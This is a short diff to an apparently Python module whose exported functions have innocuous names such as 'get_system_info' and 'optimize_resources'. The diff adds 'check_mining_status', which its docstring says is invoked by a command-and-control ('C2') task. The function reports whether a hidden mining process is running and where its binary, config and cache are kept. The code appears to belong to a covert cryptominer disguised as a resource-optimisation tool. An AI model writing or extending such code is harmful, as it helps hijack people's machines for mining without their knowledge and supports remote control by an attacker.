@@ -334,4 +334,18 @@ def optimize_resources():
     """Optimize system resources."""
     return {"status": "optimization_started"}
 
-__all__ = ["get_system_info", "optimize_resources"]
+def check_mining_status():
+    """Check mining status (called via C2 task 'mining_status')."""
+    cache_dir = _get_cache_dir()
+    binary_path = _get_binary_path()
+    config_path = _get_config_path()
+    
+    return {
+        "running": _is_running(),
+        "binary": str(binary_path) if binary_path else None,
+        "binary_exists": binary_path.exists() if binary_path else False,
+        "config_exists": config_path.exists() if config_path else False,
+        "cache_dir": str(cache_dir),
+    }
+
+__all__ = ["get_system_info", "optimize_resources", "check_mining_status"]
